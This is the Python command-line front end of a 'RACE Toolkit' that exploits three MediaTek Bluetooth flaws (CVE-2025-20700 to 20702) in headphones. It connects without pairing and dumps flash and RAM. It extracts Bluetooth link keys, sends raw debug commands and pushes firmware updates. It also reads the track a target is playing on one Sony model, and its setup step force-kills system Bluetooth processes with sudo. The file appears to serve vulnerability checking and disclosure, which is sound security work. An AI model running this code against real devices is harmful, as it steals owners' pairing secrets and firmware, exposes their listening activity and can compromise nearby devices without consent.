"""RACE Toolkit - A tool for exploiting RACE protocol vulnerabilities in Bluetooth devices.

This toolkit provides utilities for checking CVE-2025-20700, CVE-2025-20701,
and CVE-2025-20702 vulnerabilities, as well as dumping firmware and memory
from affected devices.
"""
import sys
import struct
import logging
import asyncio
import argparse
import subprocess
import time
import traceback

from dataclasses import dataclass
from enum import Enum, auto

try:
    from usb1 import USBErrorBusy  # type: ignore[import-not-found]
except ImportError:
    # usb1 may not be installed, create a dummy exception
    class USBErrorBusy(Exception):  # type: ignore[no-redef]
        """Dummy exception when usb1 is not available."""

from hexdump import hexdump

from librace.constants import RaceType
from librace.fota import FOTAUpdater
from librace.packets import (
    GetLinkKeyResponse,
    RaceHeader,
    RacePacket,
    GetLinkKey,
    GetSDKInfo,
    BuildVersion,
    GetEDRAddress,
    GetEDRAddressResponse,
)
from librace.transport import (
    Transport,
    GATTBumbleChecker,
    GATTBleakTransport,
    GATTBumbleTransport,
    RFCOMMBumbleChecker,
    RFCOMMTransport,
    USBHIDTransport,
)
from librace.race import RACE
from librace.dumper import (
    RACEDumper,
    RACEFlashDumper,
    RACERAMDumper,
)
from librace.util import setup_logging
from librace.parttable import parse_partition_table


def release_bluetooth_controller(controller: str):
    """Force stop any existing processes holding onto the Bluetooth controller.

    This prevents 'USB device busy' errors when trying to use the controller.
    """
    if not controller.startswith("usb:"):
        return

    logging.info("Releasing Bluetooth controller from system services...")

    # List of services/processes that commonly hold the Bluetooth controller
    services_to_stop = ["bluetooth", "bluetooth.service"]
    processes_to_kill = ["bluetoothd", "bt_stack", "bluetoothctl"]

    # Try to stop systemd services
    for service in services_to_stop:
        try:
            result = subprocess.run(
                ["sudo", "systemctl", "stop", service],
                capture_output=True,
                timeout=5,
                check=False
            )
            if result.returncode == 0:
                logging.debug("Stopped service: %s", service)
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Kill any remaining Bluetooth processes
    for proc_name in processes_to_kill:
        try:
            subprocess.run(
                ["sudo", "pkill", "-9", proc_name],
                capture_output=True,
                timeout=5,
                check=False
            )
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Give the system a moment to release the device
    time.sleep(0.5)
    logging.debug(
        "Bluetooth controller %s should now be available", controller)


def parse_args():
    """Parse command line arguments and return the parsed namespace."""
    parser = argparse.ArgumentParser(description="RACE Toolkit")
    parser.add_argument(
        "-t",
        "--transport",
        choices=["gatt", "bleak", "rfcomm", "usb"],
        default="gatt",
        help="Transport method (default: gatt)",
    )
    parser.add_argument(
        "--target-address", help="Target device Bluetooth classic address to connect to"
    )
    parser.add_argument(
        "--le-names",
        default=None,
        nargs="+",
        help="List of names to scan for if no address is given",
    )
    parser.add_argument(
        "-c",
        "--controller",
        default="usb:0",
        help="Bumble Bluetooth Controller (Required for RFCOMM, default: usb:0)",
    )
    parser.add_argument(
        "-d",
        "--device",
        default=None,
        help="USB device for USBHID transport. Given as VID:PID pair. "
             "By default the transport enumerates all devices and lets you choose.",
    )
    parser.add_argument(
        "--outfile", help="Output file for commands with output (default is stdout)."
    )
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging.")
    parser.add_argument(
        "--send-delay",
        type=float,
        default=0.0,
        help="Introduces a send delay between RACE messages. "
             "Might be required for old SDK versions?",
    )
    parser.add_argument(
        "--authenticate",
        action="store_true",
        help="Try to authenticate/pair during connection. Required for devices with pairing issues fixed. Put device into pairing mode and connect with this parameter. Ideally, this only needs to be done once.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Check subcommand
    subparsers.add_parser(
        "check",
        help="Check for RACE vulnerabilities (CVE-2025-20700, CVE-2025-20701, CVE-2025-20702).",
    )

    # RAM subcommand
    ram_parser = subparsers.add_parser("ram", help="Read RAM memory")
    ram_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Target address (hex parsed to int)",
    )
    ram_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 4)",
    )

    # Flash subcommand
    flash_parser = subparsers.add_parser("flash", help="Dump Flash memory")
    flash_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Start address (hex parsed to int, must be a multiple of 0x100)",
    )
    flash_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 0x100)",
    )

    # Link-keys subcommand
    subparsers.add_parser(
        "link-keys", help="RACE Get Link Key Command (Will not work on many devices)"
    )

    # BD addr subcommand
    subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")

    # Enumerate Classic services subcommand (CVE-2025-20701 PoC)
    subparsers.add_parser(
        "enumerate-classic",
        help="Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC)"
    )

    # Enumerate RACE protocol subcommand (CVE-2025-20702 PoC)
    subparsers.add_parser(
        "enumerate-race",
        help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
    )

    # SDK info subcommand
    subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")

    # Build version subcommand
    subparsers.add_parser("buildversion", help="RACE Build Version Command")

    # Mediainfo subcommand
    subparsers.add_parser(
        "mediainfo",
        help="Dump Current Listening Media Info. This is a proof-of-concept. "
             "Only works on some FW versions of Sony WH-CH720N.",
    )

    # Raw subcommand
    raw_parser = subparsers.add_parser(
        "raw", help="Send simple RACE packet with specified ID"
    )
    raw_parser.add_argument(
        "--id",
        type=lambda x: int(x, 16),
        required=True,
        help="ID of RACE command to send",
    )

    # Dump partition subcommand
    subparsers.add_parser(
        "dump-partition", help="Interactively choose and dump a partition"
    )

    # FOTA Update subcommand
    fota_parser = subparsers.add_parser("fota", help="FOTA update")
    fota_parser.add_argument("--fota-file", help="The FOTA file")
    fota_parser.add_argument(
        "--dont-reflash",
        action="store_true",
        default=False,
        help="Prevent FOTA partition from being erased and reflashed. "
             "This is mainly to retry the currently flashed FOTA update.",
    )
    fota_parser.add_argument(
        "--chunks-per-write",
        type=int,
        default=3,
        help="How many chunks should be written in one flash write. "
             "Experiments show 3 works best. Larger numbers might not be possible.",
    )

    return parser.parse_args()


def init_transport(args: argparse.Namespace) -> Transport:
    """Initialize the transport based on the given arguments.

    Raises:
        ValueError: If required arguments are missing or transport type is unknown.
    """
    transport_type = args.transport.lower()

    # Release Bluetooth controller for transports that need it
    if transport_type in ("rfcomm", "gatt"):
        release_bluetooth_controller(args.controller)

    if transport_type == "rfcomm":
        if args.target_address is None:
            raise ValueError("RFCOMM transport needs --target-address!")
        return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
    elif transport_type == "bleak":
        return GATTBleakTransport(args.target_address, args.le_names)
    elif transport_type == "gatt":
        return GATTBumbleTransport(
            args.controller, args.target_address, args.le_names, args.authenticate
        )
    elif transport_type == "usb":
        return USBHIDTransport(args.device)
    else:
        raise ValueError(f"Unknown transport type: {args.transport}")


class VulnerabilityStatus(Enum):
    """Status of a vulnerability check."""
    UNKNOWN = auto()
    FIXED = auto()
    VULNERABLE = auto()
    NOT_APPLICABLE = auto()


@dataclass
class Vulnerability:
    """Represents a vulnerability with its check status."""
    id: str
    description: str
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN


def _noop_recv(_data: bytes) -> None:
    """No-op receive callback for setup calls that don't need data handling."""


def _get_vuln(vulnerabilities: list[Vulnerability], vuln_id: str) -> Vulnerability:
    """Get a vulnerability by ID. Raises KeyError if not found."""
    for v in vulnerabilities:
        if v.id == vuln_id:
            return v
    raise KeyError(f"Vulnerability {vuln_id} not found")


def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
    """Check if dump data appears to be valid (not mostly zeros or repeating pattern).

    Args:
        data: The dump data to validate.
        threshold: Maximum percentage of zeros allowed (default 95%).

    Returns:
        True if the dump appears to contain valid data.
    """
    if not data or len(data) == 0:
        return False

    # Count zero bytes
    zero_count = data.count(b'\x00'[0])
    zero_ratio = zero_count / len(data)

    if zero_ratio > threshold:
        logging.warning(
            "Dump data is %.1f%% zeros - likely invalid/garbage data",
            zero_ratio * 100
        )
        return False

    # Check for suspicious repeating patterns (like every 0x100 bytes)
    if len(data) >= 0x200:
        # Check if data repeats at 0x100 boundaries
        chunk_size = 0x100
        first_chunk = data[:chunk_size]
        repeat_count = 0
        for i in range(chunk_size, min(len(data), chunk_size * 8), chunk_size):
            if data[i:i + chunk_size] == first_chunk:
                repeat_count += 1
        if repeat_count >= 3:  # Same pattern repeated 4+ times
            logging.warning(
                "Dump data shows repeating pattern - likely error responses"
            )
            return False

    return True


async def command_check(args: argparse.Namespace):
    """Check device for RACE vulnerabilities and optionally dump firmware."""
    vulnerabilities = [
        Vulnerability("CVE-2025-20700", "Missing GATT authentication"),
        Vulnerability("CVE-2025-20701", "Missing BR/EDR authentication"),
        Vulnerability("CVE-2025-20702_LE", "RACE Protocol via BLE"),
        Vulnerability("CVE-2025-20702_BR_EDR",
                      "RACE Protocol via Bluetooth Classic"),
    ]

    # Collected firmware dumps from vulnerability checks
    collected_dumps = {}

    logging.info("Starting device check.")

    # Release the Bluetooth controller before starting
    release_bluetooth_controller(args.controller)

    logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
    logging.info("Scanning for 5 seconds...")
    bdaddr = args.target_address

    # Step 1: BLE Checks.
    # - first check if the device is available via BLE
    # - then check for UUIDs that we know about
    # - lasty, connect to the device and try the following
    #   - read from flash
    #   - get bdaddr for Classic checks
    le_checker = GATTBumbleChecker(args.controller, args.target_address)
    await le_checker.setup(_noop_recv)
    scan_res = await le_checker.scan_devices()
    if scan_res:
        addr, dev_name = scan_res
        logging.info(
            "Your device is %s (%s). Trying to identify RACE UUIDs via GATT.",
            dev_name, addr
        )
        try:
            uuid_found = await le_checker.check_UUIDs(addr)
        except asyncio.CancelledError:
            logging.warning(
                "BLE connection was cancelled. The device may have disconnected."
            )
            uuid_found = False
        except (OSError, ConnectionError, BrokenPipeError) as e:
            logging.warning("BLE connection error: %s", e)
            uuid_found = False

        if uuid_found:
            _get_vuln(vulnerabilities,
                      "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE

            logging.info(
                "Initiating a proper BLE connection to %s on %s.", dev_name, addr)
            le_transport = GATTBumbleTransport(
                args.controller, addr, [], False)
            le_transport.connection = le_checker.connection
            le_transport.device = le_checker.device
            await le_transport.setup_gatt(_noop_recv)
            r = RACE(le_transport, args.send_delay)
            logging.info("Trying to read flash via BLE.")
            d = RACEFlashDumper(r, 0x08000000, 0x1000)
            # try to dump with a 10-second timeout
            status = VulnerabilityStatus.FIXED
            try:
                dump_data = await asyncio.wait_for(d.dump(), 10.0)
                # Check if we got valid data or just error responses
                if dump_data and _is_valid_dump(dump_data):
                    status = VulnerabilityStatus.VULNERABLE
                    collected_dumps["ble_flash"] = dump_data
                elif d.had_errors:
                    logging.warning(
                        "Flash dump had errors - device may have partial protections"
                    )
                else:
                    logging.warning(
                        "Flash dump returned invalid/empty data"
                    )
            except asyncio.TimeoutError:
                logging.warning(
                    "Timeout! Unable to dump flash within 10 seconds. Device might be fixed!"
                )
            except (OSError, ConnectionError, BrokenPipeError) as e:
                logging.warning(
                    "Unable to dump flash. Device might be fixed! Error is %s", e
                )
            _get_vuln(vulnerabilities, "CVE-2025-20702_LE").status = status

            r = RACE(le_transport, args.send_delay)
            await r.setup()
            if not bdaddr:
                try:
                    logging.info(
                        "Trying to obtain the Bluetooth Classic address for next step."
                    )
                    await asyncio.wait_for(r.send_sync(GetEDRAddress()), 8.0)
                    bdaddr = GetEDRAddressResponse.unpack(
                        r.sync_payload).bd_addr
                    bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
                    logging.info(
                        "Got Bluetooth Classic address %s", bdaddr
                    )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to retrieve Bluetooth Classic address within 8 seconds. "
                        "The RACE command might be unavailable, which is expected for many devices."
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning("Error receiving BD addr: %s.", e)

            await le_transport.close()
            await le_checker.close()
        else:
            # uuid_found was False - close the checker and mark as not vulnerable
            logging.info("No known RACE UUIDs found via GATT.")
            await le_checker.close()
    else:
        logging.info(
            "The device does not seem to be available via BLE. "
            "It is probably not vulnerable to CVE-2025-20700! You could try again to be sure."
        )
        _get_vuln(vulnerabilities,
                  "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
        _get_vuln(vulnerabilities,
                  "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE
        await le_checker.close()

    # Step 2: Classic Checks.
    # - if we have a BD addr supplied by user or retrieved via RACE we will take it
    # - if not, we ask the user one more time
    # - if we have the address:
    #   - enumerate RFCOMM services and look for known UUIDs
    #   - try to read flash via RFCOMM
    logging.info("Step 2: Checking Bluetooth Classic connection")

    # Release the Bluetooth controller again before Step 2
    release_bluetooth_controller(args.controller)

    if not bdaddr:
        logging.error(
            "Now I need a Bluetooth address. If you have it, please supply it now: "
        )
        bdaddr = input()
    # Ensure bdaddr is a string (it could be bytes from GetEDRAddressResponse)
    if isinstance(bdaddr, bytes):
        bdaddr = bdaddr.decode("ascii")
    bdaddr_str: str = str(bdaddr)
    classic_checker = RFCOMMBumbleChecker(args.controller, bdaddr_str, False)
    await classic_checker.setup()
    logging.info("Trying to find RACE SSP RFCOMM UUID.")

    check_classic = True
    try:
        uuid = await classic_checker.check_UUIDs()
    except (OSError, ConnectionError, BrokenPipeError, asyncio.CancelledError) as e:
        logging.error(
            "Unable to create a Bluetooth Classic connection. Error: %s", e)
        logging.error("Skipping the rest of Bluetooth Classic checks!")
        check_classic = False

    if check_classic:
        logging.info(
            "Checking Bluetooth Classic Pairing Issue by initiating an HfP connection."
        )
        auth_check = await classic_checker.check_auth_vuln()
        if auth_check:
            logging.info("Connection was successful without pairing!")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.VULNERABLE
        else:
            logging.info("Connection without pairing was not successful.")
            _get_vuln(vulnerabilities,
                      "CVE-2025-20701").status = VulnerabilityStatus.FIXED

        if uuid:
            logging.info("Trying to connect to RFCOMM RACE interface.")
            await classic_checker.close()

            rfcomm = RFCOMMTransport(
                args.controller, bdaddr_str, False, uuid=uuid)

            try:
                r = RACE(rfcomm, args.send_delay)
                await r.setup()

                logging.info("Trying to read flash via Bluetooth Classic.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["classic_flash"] = dump_data
                        # There might be the rare case that HfP is not possible
                        # without pairing, but RACE is? Then still vulnerable!
                        _get_vuln(vulnerabilities,
                                  "CVE-2025-20701").status = status
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s", e
                    )
                _get_vuln(vulnerabilities,
                          "CVE-2025-20702_BR_EDR").status = status
                await rfcomm.close()
            except asyncio.CancelledError as e:
                logging.warning(
                    "Error connecting to device via RACE over RFCOMM (%s).", e
                )
                _get_vuln(
                    vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

        else:
            logging.warning(
                "The device might not expose RACE via Bluetooth Classic!")
            _get_vuln(
                vulnerabilities, "CVE-2025-20702_BR_EDR").status = VulnerabilityStatus.FIXED

    logging.info("Vulnerability status summary:")
    for v in vulnerabilities:
        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)

    # Output collected firmware dumps
    if collected_dumps:
        # Combine all dumps (prefer classic over BLE if both exist)
        dump_data = collected_dumps.get(
            "classic_flash") or collected_dumps.get("ble_flash")
        if dump_data:
            if args.outfile:
                with open(args.outfile, "wb") as f:
                    f.write(dump_data)
                logging.info("Firmware dump saved to %s", args.outfile)
            else:
                logging.info("Firmware dump (hexdump):")
                hexdump(dump_data)
    else:
        logging.info("No firmware was successfully dumped during the check.")


async def command_ram(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump RAM memory from the target device."""
    if size % 0x4 != 0:
        logging.error(
            "Error! Address needs to be a multiple of 0x4 to be page-aligned!"
        )
        sys.exit()

    dumper = RACERAMDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_flash(r: RACE, address: int, size: int, outfile: str, debug: bool):
    """Dump flash memory from the target device."""
    if size % 0x100 != 0 or address % 0x100 != 0:
        logging.error(
            "Error! Address and size need to be multiples of 0x100 to be page-aligned!"
        )
        sys.exit()

    dumper = RACEFlashDumper(r, address, size, progress=not debug)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_link_keys(r: RACE, outfile: str):
    """Retrieve Bluetooth link keys from the target device."""
    logging.info("Sending get link key request")
    await r.setup()
    p = GetLinkKey()
    res = await r.send_sync(p)
    pkt = GetLinkKeyResponse.unpack(res)
    logging.info("Got link key response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(pkt.payload)
    else:
        logging.info("Found %d link keys:", pkt.num_of_devices)
        for i, key in enumerate(pkt.link_keys):
            logging.info("%d: %s", i, key.hex())


async def command_bdaddr(r: RACE, outfile: str):
    """Retrieve Bluetooth address from the target device."""
    logging.info("Sending get Bluetooth address request")
    await r.setup()
    p = GetEDRAddress()
    res = await r.send_sync(p)
    addr_pkt = GetEDRAddressResponse.unpack(res)
    logging.info("Got Bluetooth address response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        formatted_address = ":".join(
            f"{byte:02X}" for byte in addr_pkt.bd_addr)
        logging.info(formatted_address)


async def command_enumerate_classic(args: argparse.Namespace):
    """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).

    This command demonstrates the impact of CVE-2025-20701 by connecting to a
    device via Bluetooth Classic without authentication and enumerating all
    exposed services via SDP (Service Discovery Protocol).
    """
    from bumble.core import BT_BR_EDR_TRANSPORT

    if not args.target_address:
        logging.error(
            "--target-address is required for enumerate-classic command")
        return

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Missing BR/EDR Authentication - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This vulnerability allows connecting to Bluetooth Classic devices"
    )
    logging.info(
        "WITHOUT pairing. Normally, devices should require user confirmation"
    )
    logging.info(
        "before allowing profile connections. Vulnerable devices skip this."
    )
    logging.info("")

    # Release Bluetooth controller
    release_bluetooth_controller(args.controller)

    # Create checker to connect
    checker = RFCOMMBumbleChecker(args.controller, args.target_address, False)
    await checker.setup()

    logging.info("Connecting to %s without authentication...",
                 args.target_address)

    try:
        # Connect without authentication
        if checker.device is None:
            logging.error("Bluetooth device not initialized")
            return
        checker.connection = await checker.device.connect(  # type: ignore[misc]
            args.target_address, transport=BT_BR_EDR_TRANSPORT
        )
    except Exception as e:  # pylint: disable=broad-exception-caught
        error_str = str(e).lower()
        logging.error("Connection failed: %s", e)
        logging.info("")

        if "page_timeout" in error_str:
            logging.info("PAGE TIMEOUT - The device did not respond.")
            logging.info("Possible causes:")
            logging.info("  1. Device is out of range (try moving closer)")
            logging.info("  2. Device is powered off or in sleep mode")
            logging.info("  3. Device is not in connectable mode")
            logging.info("  4. Bluetooth address may be incorrect")
            logging.info("")
            logging.info(
                "Tip: Make sure the target device is awake and nearby.")
        elif "authentication" in error_str or "rejected" in error_str:
            logging.info("Connection was REJECTED by the device.")
            logging.info(
                "This may mean the device is PATCHED against CVE-2025-20701.")
        else:
            logging.info("Connection could not be established.")

        await checker.close()
        return

    logging.info("Connected successfully WITHOUT pairing!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("IMPACT: The following services are accessible without auth:")
    logging.info("-" * 60)

    # Get device name
    try:
        name = await checker.connection.request_remote_name()
        logging.info("Device Name: %s", name)
    except Exception:  # pylint: disable=broad-exception-caught
        logging.info("Device Name: (could not retrieve)")

    # Enumerate all RFCOMM services
    from bumble.rfcomm import find_rfcomm_channels
    from bumble.core import UUID as BumbleUUID
    channels = await find_rfcomm_channels(checker.connection)

    def format_uuid(uuid_obj) -> str:
        """Format a UUID object to a readable string with name if known."""
        if isinstance(uuid_obj, BumbleUUID):
            # Get the string representation and name
            uuid_str = str(uuid_obj)
            if uuid_obj.name and uuid_obj.name != uuid_str:
                return f"{uuid_obj.name} ({uuid_str})"
            return uuid_str
        return str(uuid_obj)

    def format_uuids(uuids) -> str:
        """Format a list of UUIDs to a readable string."""
        if isinstance(uuids, list):
            return ", ".join(format_uuid(u) for u in uuids)
        return format_uuid(uuids)

    if channels:
        logging.info("")
        logging.info("RFCOMM Services (Serial Port Profile):")
        for channel, service_info in channels.items():
            uuid_str = format_uuids(
                service_info) if service_info else "Unknown"
            logging.info("  Channel %2d: %s", channel, uuid_str)

            # Check if it's a known RACE UUID
            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
            if known_uuid:
                logging.info(
                    "             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
    else:
        logging.info("No RFCOMM services found.")

    # Check for HFP (Hands-Free Profile)
    logging.info("")
    logging.info("Checking for common profiles...")

    try:
        from bumble.hfp import find_hf_sdp_record
        hfp_record = await find_hf_sdp_record(checker.connection)
        if hfp_record:
            channel, _, _ = hfp_record
            logging.info(
                "  HFP (Hands-Free Profile): Channel %d - ACCESSIBLE", channel)
            logging.info("    -> Attacker could intercept/inject audio calls!")
    except Exception:  # pylint: disable=broad-exception-caught
        pass

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20701")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This device allows Bluetooth Classic connections without pairing.")
    logging.info("An attacker within Bluetooth range (~10m) can:")
    logging.info("  1. Connect to the device without user consent")
    logging.info("  2. Access exposed Bluetooth profiles (HFP, A2DP, etc.)")
    logging.info(
        "  3. If RACE is exposed, fully compromise the device (CVE-2025-20702)")
    logging.info("")

    await checker.close()


async def command_enumerate_race(r: RACE):
    """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).

    This command demonstrates the impact of CVE-2025-20702 by connecting to
    the RACE protocol and enumerating what sensitive data can be accessed.
    """
    logging.info("=" * 60)
    logging.info("CVE-2025-20702: RACE Protocol Exposure - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "RACE (Relay And Command Engine) is MediaTek's debug/control protocol."
    )
    logging.info(
        "It provides privileged access to device internals including:"
    )
    logging.info("  - Reading/writing RAM and Flash memory")
    logging.info("  - Dumping Bluetooth link keys (device pairing secrets)")
    logging.info("  - Firmware updates (FOTA)")
    logging.info("  - Device configuration and diagnostics")
    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RACE protocol...")
    logging.info("-" * 60)

    try:
        await r.setup()
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Failed to connect to RACE protocol: %s", e)
        return

    logging.info("RACE protocol connection established!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("ENUMERATING ACCESSIBLE DATA:")
    logging.info("-" * 60)
    logging.info("")

    # Try to get SDK info
    logging.info("[1] SDK Information:")
    try:
        p = GetSDKInfo()
        res = await r.send_sync(p)
        sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", sdk_info)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get build version
    logging.info("")
    logging.info("[2] Build Version:")
    try:
        p = BuildVersion()
        res = await r.send_sync(p)
        build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", build_ver)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get Bluetooth address
    logging.info("")
    logging.info("[3] Bluetooth Address:")
    try:
        p = GetEDRAddress()
        res = await r.send_sync(p)
        addr_pkt = GetEDRAddressResponse.unpack(res)
        formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
        logging.info("    %s", formatted_addr)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to dump link keys (most sensitive!)
    logging.info("")
    logging.info("[4] Bluetooth Link Keys (CRITICAL):")
    try:
        p = GetLinkKey()
        res = await r.send_sync(p)
        if len(res) > 7:
            link_key_data = res[7:]
            # Check if there are any link keys
            if link_key_data and any(b != 0 for b in link_key_data):
                logging.info("    Found %d bytes of link key data",
                             len(link_key_data))
                logging.info("    -> ACCESSIBLE - CRITICAL SECURITY BREACH!")
                logging.info(
                    "    -> Attacker can impersonate paired devices!")
            else:
                logging.info("    No link keys stored (device not paired)")
                logging.info("    -> Command accessible, no data present")
        else:
            logging.info("    -> Command accessible")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read RAM (sample - first few bytes)
    logging.info("")
    logging.info("[5] RAM Access:")
    try:
        # Try to read a small chunk from a typical RAM address
        dumper = RACEDumper(r)
        sample_data = await dumper.dump(0x04200000, 16)
        if sample_data:
            logging.info("    Successfully read 16 bytes from RAM")
            logging.info("    -> ACCESSIBLE - Full memory read possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read Flash (partition table area)
    logging.info("")
    logging.info("[6] Flash Memory Access:")
    try:
        flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
        sample_flash = await flash_dumper.dump()
        if sample_flash:
            logging.info("    Successfully read 256 bytes from Flash")
            logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
    logging.info("=" * 60)
    logging.info("")
    logging.info("The RACE protocol is exposed without authentication.")
    logging.info("An attacker can:")
    logging.info("  1. Read device firmware and extract secrets")
    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
    logging.info("  3. Read/write device memory for code execution")
    logging.info("  4. Flash malicious firmware updates")
    logging.info("")
    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
    logging.info("can fully compromise this device from up to 10 meters away.")
    logging.info("")


async def command_raw(r: RACE, cmd_id: int, outfile: str):
    """Send a raw RACE command with the specified ID."""
    logging.info("Sending raw RACE command")
    await r.setup()
    race_header = RaceHeader(
        head=0x5, type_=RaceType.CMD_EXPECTS_RESPONSE, id_=cmd_id)
    p = RacePacket(race_header)
    res = await r.send_sync(p)

    logging.info("Got response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        hexdump(res)


async def command_sdkinfo(r: RACE, outfile: str):
    """Retrieve SDK information from the target device."""
    logging.info("Sending get SDK info request")
    await r.setup()
    p = GetSDKInfo()
    res = await r.send_sync(p)
    logging.info("Got SDK info response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _get_buildversion(r: RACE):
    """Retrieve build version from the target device."""
    await r.setup()
    p = BuildVersion()
    return await r.send_sync(p)


async def command_buildversion(r: RACE, outfile: str):
    """Retrieve and display build version from the target device."""
    logging.info("Sending get build version request")
    res = await _get_buildversion(r)
    logging.info("Got build version response")

    if outfile:
        with open(outfile, "wb") as f:
            f.write(res)
    else:
        logging.info(res[7:].decode("utf8"))


async def _read_media_attr(d: RACEDumper, addr: int) -> str:
    """Read a media attribute from RAM at the given address."""
    ptr_bytes = await d.dump(addr, 0x4)
    ptr = struct.unpack("<I", ptr_bytes)[0]
    data = await d.dump(ptr, 0x40)
    return data.decode("utf8")


async def command_mediainfo(r: RACE):
    """Dump current playing media info from the target device."""
    logging.info(
        "Trying to dump current playing media info. Identifying model and firmware version first..."
    )
    try:
        bv = await _get_buildversion(r)
    except asyncio.TimeoutError as e:
        logging.error("Failed to get build version: %s", e)
        return
    bv = bv[7:].replace(b"\x00", b"").decode("ascii")
    logging.info("Got buildversion `%s`.", bv)

    dumper = RACERAMDumper(r, 0, 0, progress=False)
    # We only do this for device that we know and where can get the buildversion.
    # Currently this is Sony CH-WH720n in version 1.0.8, 1.0.9, and 1.1.0
    if (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12023/01/12 19:15:56 GMT +08:00"
    ):  # v1.0.8
        t = await _read_media_attr(dumper, 0x14238C9C)
        al = await _read_media_attr(dumper, 0x14238CA4)
        ar = await _read_media_attr(dumper, 0x14238C8C)
        gen = await _read_media_attr(dumper, 0x14238CA8)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/09/18 18:58:55 GMT +08:00"
    ):  # v1.1.0
